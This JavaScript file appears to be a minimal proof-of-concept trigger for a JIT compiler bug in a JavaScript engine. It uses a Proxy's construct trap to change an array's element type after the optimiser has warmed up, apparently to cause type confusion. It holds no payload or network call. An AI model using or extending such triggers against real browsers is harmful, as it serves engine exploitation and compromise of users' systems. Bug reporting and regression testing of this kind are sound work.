let flag = false;
const arr = [1337, 1338];
const victim = { p: 0 };

class A {
    constructor() {
        this.x = 1;
    }
}

const p = new Proxy(A, {
    construct(target, args, newTarget) {
        if (flag) {
            arr[0] = 1.1;
        }
        return Reflect.construct(target, args, newTarget);
    }
});

function trigger() {
    Reflect.construct(A, [], p);
    victim.p = arr[0];
}

for (let i = 0; i < 25000; i++) {
    trigger();
}

flag = true;
trigger();